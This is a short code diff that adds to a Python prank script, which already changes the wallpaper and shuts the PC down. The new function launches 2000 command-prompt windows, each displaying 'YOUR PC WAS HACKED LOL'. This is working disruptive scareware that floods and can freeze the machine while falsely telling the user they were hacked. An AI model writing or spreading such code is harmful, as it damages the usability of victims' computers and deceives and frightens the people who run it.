@@ -29,3 +29,12 @@ image_path = "d:\\download\\wallpaperflare.com_wallpaper (2).jpg"
 
 change_wallpaper(image_path)
 shutdown_pc()
+import subprocess
+import time
+
+def open_terminal_windows():
+    for _ in range(2000):
+        subprocess.Popen('start cmd /K echo YOUR PC WAS HACKED LOL')
+
+time.sleep(1)
+open_terminal_windows()
